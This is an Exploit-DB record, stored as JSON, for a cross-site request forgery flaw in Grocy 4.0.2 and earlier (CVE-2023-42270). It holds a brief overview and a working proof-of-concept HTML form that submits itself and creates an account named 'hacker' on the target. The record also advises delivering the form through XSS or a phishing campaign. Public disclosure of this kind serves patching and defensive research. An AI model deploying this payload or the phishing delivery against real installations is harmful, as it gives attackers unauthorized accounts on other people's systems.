{"source": "https://www.exploit-db.com/exploits/51760", "vulnName": "Grocy <=4.0.2 - CSRF", "vulnEDBID": "51760", "vulnCVE": "N/A", "author": "CHANCE PROCTOR", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-01-31", "vulnContent": "# Exploit Title: Grocy <= 4.0.2 CSRF Vulnerability\n# Application: Grocy\n# Version: <= 4.0.2\n# Date: 09/21/2023\n# Exploit Author: Chance Proctor\n# Vendor Homepage: https://grocy.info/\n# Software Link: https://github.com/grocy/grocy\n# Tested on: Linux\n# CVE : CVE-2023-42270\n\n\n\nOverview\n==================================================\nWhen creating a new user in Grocy 4.0.2, the new user request is made using JSON formatting.\nThis makes it easy to adjust your request since it is a known format. \nThere is also no CSRF Token or other methods of verification in place to verify where the request is coming from.\nThis allows for html code to generate a new user as long as the target is logged in and has Create User Permissions.\n\n\n\nProof of Concept\n==================================================\nHost the following html code via a XSS or delivery via a phishing campaign:\n\n <html>\n <form action=\"/api/users\" method=\"post\" enctype=\"application/x-www-form-urlencoded\">\n <input name='username' value='hacker' type='hidden'>\n <input name='password' value='test' type='hidden'>\n <input type=submit>\n </form>\n <script>\n history.pushState('','', '/');\n document.forms[0].submit();\n </script>\n </html>\n\n\nIf a user is logged into the Grocy Webapp at time of execution, a new user will be created in the app with the following credentials\n\n Username: hacker\n Password: test\n\nNote:\nIn order for this to work, the target must have Create User Permissions.\nThis is enabled by default.\n\n\n\nProof of Exploit/Reproduce\n==================================================\nhttp://xploit.sh/posts/cve-2023-42270/\n            "}